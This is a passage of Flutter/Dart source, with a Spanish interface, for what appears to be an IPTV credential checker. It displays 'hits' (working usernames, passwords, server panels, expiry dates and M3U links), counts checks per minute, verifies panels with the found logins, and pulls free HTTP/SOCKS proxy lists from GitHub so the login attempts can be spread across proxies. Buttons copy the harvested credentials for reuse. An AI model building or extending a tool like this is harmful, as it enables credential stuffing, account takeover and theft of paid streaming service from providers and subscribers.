                  color: cRe.withOpacity(0.1), borderRadius: BorderRadius.circular(3),
                  border: Border.all(color: cRe.withOpacity(0.3))),
                child: const Text('✕', style: TextStyle(color: cRe, fontSize: 11)),
              ),
            ),
          ]),
        )),
      ],
    ])),
    _sec('TIMEOUT'),
    _card(child: Column(children: [
      Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
        const Text('SEGUNDOS POR PETICIÓN', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
        Text('${_tout}s', style: const TextStyle(fontSize: 20, color: cG, fontFamily: 'monospace',
          fontWeight: FontWeight.bold, shadows: [Shadow(color: cG, blurRadius: 8)])),
      ]),
      Slider(value: _tout.toDouble(), min: 5, max: 30,
        onChanged: (v) => setState(() => _tout = v.round())),
      Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
        _qtBtn('5s', 5), _qtBtn('8s', 8), _qtBtn('10s', 10), _qtBtn('15s', 15), _qtBtn('20s', 20),
      ]),
    ])),
  ]);

  Widget _qtBtn(String label, int val) => GestureDetector(
    onTap: () => setState(() => _tout = val),
    child: Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: _tout == val ? cG.withOpacity(0.15) : Colors.transparent,
        borderRadius: BorderRadius.circular(3),
        border: Border.all(color: _tout == val ? cG.withOpacity(0.5) : cBr),
      ),
      child: Text(label, style: TextStyle(
        fontSize: 10, color: _tout == val ? cG : cDg, fontWeight: FontWeight.bold)),
    ),
  );

  Widget _hitsTab() => Column(children: [
    Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      color: cBg2.withOpacity(0.9),
      child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
        Row(children: [
          AnimatedBuilder(animation: _glow, builder: (_, __) => Text('${_hits.length}',
            style: TextStyle(fontSize: 22, color: cG, fontFamily: 'monospace',
              fontWeight: FontWeight.bold,
              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
          const SizedBox(width: 6),
          const Text('HITS', style: TextStyle(fontSize: 11, color: cDg, letterSpacing: 3, fontWeight: FontWeight.bold)),
        ]),
        Row(children: [
          _sbtn('💾 EXPORTAR', c: cCy, onTap: _export),
          const SizedBox(width: 8),
          _sbtn('🗑 LIMPIAR', c: cRe, onTap: () => setState(() => _hits.clear())),
        ]),
      ]),
    ),
    Expanded(child: _hits.isEmpty
      ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
          AnimatedBuilder(animation: _pulse, builder: (_, __) => Text('🎯',
            style: TextStyle(fontSize: 48,
              shadows: [Shadow(color: cG.withOpacity(_pulse.value * 0.5), blurRadius: 20)]))),
          const SizedBox(height: 12),
          const Text('LOS HITS APARECERÁN AQUÍ', style: TextStyle(fontSize: 11, color: cDg, letterSpacing: 2)),
          const SizedBox(height: 4),
          Text('Inicia un escaneo para comenzar', style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.6))),
        ]))
      : ListView.builder(
          padding: const EdgeInsets.all(10),
          itemCount: _hits.length,
          itemBuilder: (_, i) => _hitCard(_hits[i]))),
  ]);

  Widget _hitCard(HitItem h) => Container(
    margin: const EdgeInsets.only(bottom: 12),
    decoration: BoxDecoration(
      gradient: const LinearGradient(
        begin: Alignment.topLeft, end: Alignment.bottomRight,
        colors: [Color(0xFF001A00), Color(0xFF000D00)]),
      borderRadius: BorderRadius.circular(8),
      border: Border(
        left: const BorderSide(color: cG, width: 3),
        top: BorderSide(color: cG.withOpacity(0.3)),
        right: BorderSide(color: cG.withOpacity(0.1)),
        bottom: BorderSide(color: cG.withOpacity(0.1)),
      ),
      boxShadow: [BoxShadow(color: cG.withOpacity(0.08), blurRadius: 15, offset: const Offset(0, 4))],
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Padding(padding: const EdgeInsets.fromLTRB(14, 12, 14, 10), child: Column(
        crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(width: 8, height: 8, decoration: const BoxDecoration(
            shape: BoxShape.circle, color: cG,
            boxShadow: [BoxShadow(color: cG, blurRadius: 6)],
          )),
          const SizedBox(width: 8),
          Expanded(child: Text(h.username, style: const TextStyle(color: cG, fontSize: 14,
            fontWeight: FontWeight.bold, letterSpacing: 0.5))),
        ]),
        const SizedBox(height: 4),
        Padding(padding: const EdgeInsets.only(left: 16), child: Column(
          crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(children: [
            Text('🔑 ', style: TextStyle(fontSize: 11)),
            Text(h.password, style: const TextStyle(color: cDg, fontSize: 11)),
          ]),
          const SizedBox(height: 2),
          Row(children: [
            Text('🖥 ', style: TextStyle(fontSize: 10)),
            Expanded(child: Text(h.panel, style: const TextStyle(color: cCy, fontSize: 9),
              overflow: TextOverflow.ellipsis)),
          ]),
        ])),
        const SizedBox(height: 8),
        Wrap(spacing: 5, runSpacing: 5, children: [
          _bdg('📅 ${h.expira}', cYe),
          _bdg('🔗 ${h.activ}/${h.conex}', cCy),
          _bdg('✓ ${h.status}', cG),
          if (h.timezone.isNotEmpty) _bdg('🌍 ${h.timezone}', cMg),
        ]),
      ])),
      Container(
        margin: const EdgeInsets.symmetric(horizontal: 14),
        height: 1,
        color: cG.withOpacity(0.08),
      ),
      Padding(padding: const EdgeInsets.fromLTRB(14, 10, 14, 10), child: Column(
        crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(width: 4, height: 4, decoration: const BoxDecoration(shape: BoxShape.circle, color: cCy)),
          const SizedBox(width: 6),
          const Text('VERIFICACIÓN DE PANEL', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2, fontWeight: FontWeight.bold)),
        ]),
        const SizedBox(height: 8),
        h.panelInfo == null
          ? Row(children: [
              SizedBox(width: 14, height: 14,
                child: CircularProgressIndicator(strokeWidth: 2,
                  valueColor: const AlwaysStoppedAnimation(cG))),
              const SizedBox(width: 10),
              const Text('Verificando panel...', style: TextStyle(fontSize: 10, color: cDg)),
            ])
          : Row(children: [
              Expanded(child: _pbox(_fn(h.panelInfo!.live), '📺 CANALES', cG)),
              const SizedBox(width: 6),
              Expanded(child: _pbox(_fn(h.panelInfo!.vod), '🎬 VOD', cCy)),
              const SizedBox(width: 6),
              Expanded(child: _pbox(_fn(h.panelInfo!.series), '📺 SERIES', cMg)),
            ]),
      ])),
      Container(
        margin: const EdgeInsets.symmetric(horizontal: 14),
        height: 1,
        color: cG.withOpacity(0.06),
      ),
      Padding(padding: const EdgeInsets.fromLTRB(14, 8, 14, 12), child: Row(children: [
        Expanded(child: _sbtn('📋 COPIAR', c: cCy, onTap: () {
          var t = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}\nCONEX: ${h.activ}/${h.conex}';
          if (h.panelInfo != null) t += '\nCANALES: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSERIES: ${h.panelInfo!.series}';
          t += '\nM3U: ${h.m3u}';
          Clipboard.setData(ClipboardData(text: t));
          _toast('✓ Copiado');
        })),
        const SizedBox(width: 6),
        Expanded(child: _sbtn('📺 M3U', c: cG, onTap: () {
          Clipboard.setData(ClipboardData(text: h.m3u));
          _toast('✓ M3U copiado');
        })),
        const SizedBox(width: 6),
        _sbtn('🔄', c: cMg, onTap: () async {
          setState(() => h.panelInfo = null);
          final info = await verifyPanel(h.panel, h.username, h.password);
          setState(() => h.panelInfo = info);
          _toast('✓ Panel verificado');
        }),
      ])),
    ]),
  );

  final _proxyUrls = {
    'ProxiScrape HTTP': 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt',
    'TheSpeedX HTTP': 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'TheSpeedX SOCKS4': 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
    'TheSpeedX SOCKS5': 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
    'Clarketm Lista': 'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'MuRongPIG HTTP': 'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'MuRongPIG SOCKS5': 'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt',
  };

  bool _downloading = false;
  final _customUrlCtrl = TextEditingController();

  Future<void> _downloadProxies(String url) async {
    setState(() => _downloading = true);
    _toast('⌛ Descargando proxies...');
    try {
      final req = await _client.getUrl(Uri.parse(url));
      req.headers.set('User-Agent', _ua());
      final res = await req.close().timeout(const Duration(seconds: 15));
      final body = await res.transform(utf8.decoder).join();
      final lines = body.split('\n')
        .map((l) => l.trim())
        .where((l) => l.isNotEmpty && l.contains(':'))
        .toList();
      setState(() {
        _proxies.clear();
        _proxies.addAll(lines);
        _downloading = false;
      });
      _toast('✓ \${lines.length} proxies descargados');
    } catch (e) {
      setState(() => _downloading = false);
      _toast('⚠ Error descargando proxies');
    }
  }

  Widget _proxyTab() => ListView(padding: const EdgeInsets.all(10), children: [
    _card(ac: cMg, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      _ct('FUENTES ONLINE'),
      ..._proxyUrls.entries.map((e) => GestureDetector(
        onTap: () => _downloadProxies(e.value),
        child: Container(
          margin: const EdgeInsets.only(bottom: 6),
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          decoration: BoxDecoration(
            color: cMg.withOpacity(0.05),
            borderRadius: BorderRadius.circular(5),
            border: Border.all(color: cMg.withOpacity(0.25)),
          ),
          child: Row(children: [
            Container(width: 8, height: 8, decoration: const BoxDecoration(
              shape: BoxShape.circle, color: cMg,
              boxShadow: [BoxShadow(color: cMg, blurRadius: 4)],
            )),
            const SizedBox(width: 10),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(e.key, style: const TextStyle(color: cMg, fontSize: 12, fontWeight: FontWeight.bold)),
              Text(e.value.replaceAll('https://raw.githubusercontent.com/', 'github:'), 
                style: TextStyle(color: cDg.withOpacity(0.7), fontSize: 8),
                overflow: TextOverflow.ellipsis),
            ])),
            _downloading
              ? const SizedBox(width: 16, height: 16,
                  child: CircularProgressIndicator(strokeWidth: 2, color: cMg))
              : const Icon(Icons.download, color: cMg, size: 18),
          ]),
        ),
      )),
    ])),
    _card(ac: cCy, child: Column(children: [
      _ct('URL PERSONALIZADA'),
      TextField(
        controller: _customUrlCtrl,
        style: const TextStyle(color: cG, fontSize: 11, fontFamily: 'monospace'),
        decoration: InputDecoration(
          hintText: 'https://mi-lista.com/proxies.txt',
          hintStyle: TextStyle(color: cDg.withOpacity(0.6), fontSize: 11),
          filled: true, fillColor: Colors.black54,
          prefixIcon: const Icon(Icons.link, color: cDg, size: 16),
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cG, width: 1.5)),
          contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
        ),
      ),
      const SizedBox(height: 8),
      _btn('⬇ DESCARGAR DE URL', c: cCy, onTap: () {
        final url = _customUrlCtrl.text.trim();
        if (url.isEmpty) { _toast('⚠ Ingresa una URL'); return; }
        _downloadProxies(url);
      }),
    ])),
    _card(ac: cYe, child: Column(children: [
      _ct('ARCHIVO LOCAL'),
      _btn('📂 CARGAR ARCHIVO .TXT', c: cYe, onTap: _loadProxies),
    ])),
    _card(child: Column(children: [
      _ct('ESTADO'),
      _prow('TOTAL CARGADOS', '${_proxies.length}', cG),
      _prow('MODO', _proxies.isEmpty ? 'Directo' : 'Con proxies', _proxies.isEmpty ? cDg : cG),
      _prow('PROTOCOLO', 'HTTP/SOCKS4/SOCKS5', cDg),
      const SizedBox(height: 8),
      _btn('✗ LIMPIAR PROXIES', c: cRe, onTap: () => setState(() => _proxies.clear())),
    ])),
  ]);

  Widget _rbadge() => AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
    decoration: BoxDecoration(
      color: cG.withOpacity(0.08),
      borderRadius: BorderRadius.circular(20),
      border: Border.all(color: cG.withOpacity(0.3)),
      boxShadow: [BoxShadow(color: cG.withOpacity(_pulse.value * 0.2), blurRadius: 10)],
    ),
    child: Row(mainAxisSize: MainAxisSize.min, children: [
      Container(width: 6, height: 6, decoration: BoxDecoration(
        shape: BoxShape.circle, color: cG,
        boxShadow: [BoxShadow(color: cG.withOpacity(_pulse.value), blurRadius: 8)],
      )),
      const SizedBox(width: 6),
      const Text('ESCANEANDO', style: TextStyle(fontSize: 9, color: cG, letterSpacing: 2, fontWeight: FontWeight.bold)),
    ]),
  ));

  Widget _sbox(String label, String val, Color c) => Container(
    padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
    decoration: BoxDecoration(
      color: c.withOpacity(0.05),
      borderRadius: BorderRadius.circular(6),
      border: Border.all(color: c.withOpacity(0.25)),
      boxShadow: [BoxShadow(color: c.withOpacity(0.08), blurRadius: 10)],
    ),
    child: Column(children: [
      Text(val, style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold, color: c,
        fontFamily: 'monospace', shadows: [Shadow(color: c, blurRadius: 15)])),
      const SizedBox(height: 3),
      Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.6), letterSpacing: 2)),
    ]),
  );

  Widget _cpmBox() => Container(
    padding: const EdgeInsets.symmetric(vertical: 10),
    decoration: BoxDecoration(
      gradient: LinearGradient(colors: [cYe.withOpacity(0.05), cYe.withOpacity(0.1)]),
      borderRadius: BorderRadius.circular(6),
      border: Border.all(color: cYe.withOpacity(0.3)),
      boxShadow: [BoxShadow(color: cYe.withOpacity(0.1), blurRadius: 15)],
    ),
    child: Column(children: [
      AnimatedBuilder(animation: _glow, builder: (_, __) => Text(_fmt(_cpm),
        style: TextStyle(fontSize: 32, fontWeight: FontWeight.bold, color: cYe,
          fontFamily: 'monospace', letterSpacing: -1,
          shadows: [Shadow(color: cYe.withOpacity(_glow.value), blurRadius: 20)]))),
      Text('CHECKS POR MINUTO', style: TextStyle(fontSize: 8, color: cYe.withOpacity(0.6), letterSpacing: 3)),
    ]),
  );

  Widget _card({Color ac = cBr, required Widget child}) => Container(
    margin: const EdgeInsets.only(bottom: 10),
    padding: const EdgeInsets.fromLTRB(14, 12, 12, 12),
    decoration: BoxDecoration(
      color: cBg2.withOpacity(0.85),
      borderRadius: BorderRadius.circular(8),
      border: Border.all(color: cBr),
      boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 10)],
    ),
    child: Stack(children: [
      Positioned(left: -14, top: -12, bottom: -12, child: Container(width: 3,
        decoration: BoxDecoration(
          borderRadius: const BorderRadius.horizontal(left: Radius.circular(8)),
          gradient: LinearGradient(
            begin: Alignment.topCenter, end: Alignment.bottomCenter,
            colors: [ac, ac.withOpacity(0.1)])))),
      child,
    ]),
  );

  Widget _ct(String t) => Padding(padding: const EdgeInsets.only(bottom: 10), child: Row(children: [
    Container(width: 3, height: 14, color: cG,
      margin: const EdgeInsets.only(right: 8)),
    Text(t, style: const TextStyle(fontSize: 11, color: cDg, letterSpacing: 2.5, fontWeight: FontWeight.bold)),
  ]));

  Widget _sec(String t) => Padding(padding: const EdgeInsets.only(bottom: 8, top: 4), child: Row(children: [
    Container(width: 4, height: 4, margin: const EdgeInsets.only(right: 8),
      decoration: const BoxDecoration(shape: BoxShape.circle, color: cG)),
    Text(t, style: const TextStyle(fontSize: 10, color: cDg, letterSpacing: 3, fontWeight: FontWeight.bold)),
    const SizedBox(width: 8),
    Expanded(child: Container(height: 1,
      decoration: const BoxDecoration(gradient: LinearGradient(colors: [cBr, Colors.transparent])))),
  ]));

  Widget _btn(String label, {required Color c, required VoidCallback onTap}) => GestureDetector(
    onTap: onTap,
    child: Container(
      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 13),
      margin: const EdgeInsets.only(bottom: 7),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [c.withOpacity(0.06), c.withOpacity(0.12)]),
        borderRadius: BorderRadius.circular(5),
        border: Border.all(color: c.withOpacity(0.45)),
        boxShadow: [BoxShadow(color: c.withOpacity(0.12), blurRadius: 12)],
      ),
      child: Text(label, textAlign: TextAlign.center,
        style: TextStyle(color: c, fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 2,
          shadows: [Shadow(color: c, blurRadius: 10)])),
    ),
  );

  Widget _bigBtn(String label, {required VoidCallback onTap}) => GestureDetector(
    onTap: onTap,
    child: AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [
          const Color(0xFF002208), const Color(0xFF004410), const Color(0xFF002208)]),
        borderRadius: BorderRadius.circular(6),
        border: Border.all(color: cG.withOpacity(0.6), width: 1.5),
        boxShadow: [
          BoxShadow(color: cG.withOpacity(_glow.value * 0.3), blurRadius: 20),
          BoxShadow(color: cG.withOpacity(0.1), blurRadius: 40),
        ],
      ),
      child: Text(label, textAlign: TextAlign.center,
        style: TextStyle(color: cG, fontSize: 15, fontWeight: FontWeight.bold, letterSpacing: 3,
          shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)])),
    )),
  );

  Widget _sbtn(String label, {required Color c, required VoidCallback onTap}) => GestureDetector(
    onTap: onTap,
    child: Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
      decoration: BoxDecoration(
        color: c.withOpacity(0.08),
        borderRadius: BorderRadius.circular(5),
        border: Border.all(color: c.withOpacity(0.35)),
      ),
      child: Text(label, style: TextStyle(color: c, fontSize: 10,
        fontWeight: FontWeight.bold, letterSpacing: 1.5)),
    ),
  );

  Widget _bdg(String text, Color c) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
    decoration: BoxDecoration(
      color: c.withOpacity(0.1),
      borderRadius: BorderRadius.circular(3),
      border: Border.all(color: c.withOpacity(0.25))),
    child: Text(text, style: TextStyle(fontSize: 9, color: c, letterSpacing: 0.5)),
  );

  Widget _ibox(String label, String val, Color c) => Container(
    padding: const EdgeInsets.all(8),
    decoration: BoxDecoration(
      color: cBg,
      borderRadius: BorderRadius.circular(4),
      border: Border.all(color: cBr),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(label, style: const TextStyle(fontSize: 8, color: cDg, letterSpacing: 1.5)),
      const SizedBox(height: 3),
      Text(val, style: TextStyle(fontSize: 11, color: c, fontWeight: FontWeight.bold)),
    ]),
  );

  Widget _pbox(String val, String label, Color c) => Container(
    padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 6),
    decoration: BoxDecoration(
      color: c.withOpacity(0.05),
      borderRadius: BorderRadius.circular(5),
      border: Border.all(color: c.withOpacity(0.2)),
    ),
    child: Column(children: [
      Text(val, style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: c,
        fontFamily: 'monospace', shadows: [Shadow(color: c, blurRadius: 12)])),
      const SizedBox(height: 2),
      Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.7), letterSpacing: 0.5)),
    ]),
  );

  Widget _prow(String label, String val, Color c) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 7),
    child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
      Text(label, style: const TextStyle(fontSize: 10, color: cDg, letterSpacing: 1)),
      Text(val, style: TextStyle(fontSize: 10, color: c, fontWeight: FontWeight.bold)),
    ]),
  );
}

class _ScanLinePainter extends CustomPainter {
  final double progress;
  _ScanLinePainter(this.progress);

  @override
  void paint(Canvas canvas, Size size) {
    final y = size.height * progress;
    final paint = Paint()
      ..shader = LinearGradient(colors: [
        Colors.transparent,
        cG.withOpacity(0.03),
        cG.withOpacity(0.06),
        cG.withOpacity(0.03),
        Colors.transparent,
      ], stops: const [0, 0.3, 0.5, 0.7, 1]).createShader(
        Rect.fromLTWH(0, y - 30, size.width, 60));
    canvas.drawRect(Rect.fromLTWH(0, y - 30, size.width, 60), paint);
  }

  @override
  bool shouldRepaint(_ScanLinePainter old) => old.progress != progress;
}
